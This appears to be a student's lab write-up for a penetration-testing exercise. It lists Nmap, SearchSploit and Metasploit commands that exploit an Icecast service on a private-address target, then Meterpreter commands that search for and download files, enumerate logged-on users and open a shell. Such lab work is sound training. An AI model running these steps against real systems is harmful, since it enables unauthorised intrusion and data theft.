This is my step by step process to finding all exploits and the secret files, aswell as proof of concept via screenshots.


### Instructions

I've been provided full access to the network and are getting ping responses from the CEOâ€™s workstation.

1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > Answer: nmap -sV 192.168.0.20
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:

   - Run the SearchSploit commands to show available Icecast exploits.

     > Answer: searchsploit icecast
3. Now that we know which exploits are available to us, let's start Metasploit:

   - Run the command that starts Metasploit:

     > Answer: msfconsole
4. Search for the Icecast module and load it for use.

   - Run the command to search for the Icecast module:

     > Answer: search icecast

   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: use 0
5. Set the `RHOST` to the target machine.

   - Run the command that sets the `RHOST`:

     > Answer: set RHOST 192.168.0.20

6. Run the Icecast exploit.

   - Run the command that runs the Icecast exploit.

     > Answer: run

   - Run the command that performs a search for the `secretfile` textfile on the target.

     > Answer: search -f *secretfile*.txt
7. You should now have a Meterpreter session open.

    - Run the command to performs a search for the `recipe` textfile on the target:
      > Answer: search -f *recipe*.txt

    - **Bonus**: Run the command that exfiltrates the `recipe` textfile:
      > Answer: download 'c:/Users/IEuser/Documents/Drinks.recipe.txt'

8. You can also use Meterpreter's local exploit suggester to find possible exploits.

   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

### Bonus
  
A. Run a Meterpreter post script that enumerates all logged on users.

  > Answer: run post/windows/gather/enum_logged_on_users

B. Open a Meterpreter shell and gather system information for the target.

  > Answer: shell

C. Run the command that displays the target's computer system information:

   > Answer: systeminfo
